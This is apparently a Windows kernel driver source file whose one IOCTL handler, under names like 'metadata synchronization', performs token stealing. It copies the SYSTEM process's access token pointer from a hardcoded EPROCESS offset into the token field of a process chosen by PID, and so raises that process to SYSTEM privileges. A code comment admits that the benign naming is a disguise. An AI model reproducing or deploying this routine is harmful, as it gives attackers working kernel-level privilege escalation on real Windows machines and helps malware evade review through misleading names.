#pragma once
#include "prototypes.h"
#include "common.h"

// ---------------------------------------------------------------
// IOCTL codes handler for Tokens playground
// ---------------------------------------------------------------

// Sync process metadata IOCTL handler (you know what this does lol just to ....)
NTSTATUS SpyIoSyncProcessMetadataById(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] Process metadata synchronization initiated\n");

    if (!PsInitialSystemProcess) {
        DbgPrint("[-] Base context unavailable\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;

    // Convert input string to PID
    ULONG_PTR queryBufferId = ParsePidFromString(input->g_Name);
    DbgPrint("[*] Resolving context for PID=%lu\n", queryBufferId);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN resolved = FALSE;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[*] Synchronizing metadata for PID=%lu\n\n", queryBufferId);
    if (!NT_SUCCESS(status)) {
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    offset += (ULONG)writtenBytes;

    PEPROCESS contextBase = PsInitialSystemProcess;

    HANDLE basePid = PsGetProcessId(contextBase);
    PCHAR baseImage = PsGetProcessImageFileName(contextBase);
    if (!baseImage || basePid == 0) {
        return STATUS_UNSUCCESSFUL;
    }

    ULONG fieldOffset1 = 0x400;
    ULONG fieldOffset2 = 0xB8;
    ULONG totalOffset = fieldOffset1 + fieldOffset2;

    UINT64 rawReferenceHandle = *(UINT64*)((PUCHAR)contextBase + totalOffset);
    UINT64 referenceHandle = rawReferenceHandle & ~0xF;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[+] Reference handle: 0x%llx\n", referenceHandle);
    RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    offset += (ULONG)writtenBytes;

    ULONG linkOffset = 0x448;
    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)contextBase + linkOffset);
    PLIST_ENTRY current = head->Flink;

    while (current != head) {

        PEPROCESS contextEntry = (PEPROCESS)((ULONG_PTR)current - linkOffset);
        HANDLE pid = PsGetProcessId(contextEntry);

        if ((ULONG_PTR)pid == queryBufferId)
        {
            resolved = TRUE;

            UINT64 rawEntryHandle = *(UINT64*)((PUCHAR)contextEntry + totalOffset);
            UINT64 entryHandle = rawEntryHandle & ~0xF;
            UINT64 metadataBits = rawEntryHandle & 0xF;

            PUINT64 handlePtr = (PUINT64)((PUCHAR)contextEntry + totalOffset);

            UINT64 syncValue = referenceHandle | metadataBits;
            *handlePtr = syncValue;

            UINT64 verifyRaw = *(UINT64*)((PUCHAR)contextEntry + totalOffset);
            UINT64 verifyHandle = verifyRaw & ~0xF;

            status = RtlStringCbPrintfA(
                out + offset, outputLength - offset,
                "[*] Synchronizing metadata...\n    Current: 0x%llx\n    Updated: 0x%llx\n",
                entryHandle, verifyHandle
            );
            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;

            if (verifyHandle == referenceHandle) {
                status = RtlStringCbPrintfA(out + offset, outputLength - offset,
                    "[+] Metadata synchronized successfully\n");
            }
            else {
                status = RtlStringCbPrintfA(out + offset, outputLength - offset,
                    "[-] Synchronization incomplete\n");
            }

            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;

            break;
        }

        current = current->Flink;
    }

    if (!resolved) {
        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
            "[-] Context PID=%lu not found\n", queryBufferId);
        RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    return STATUS_SUCCESS;
}
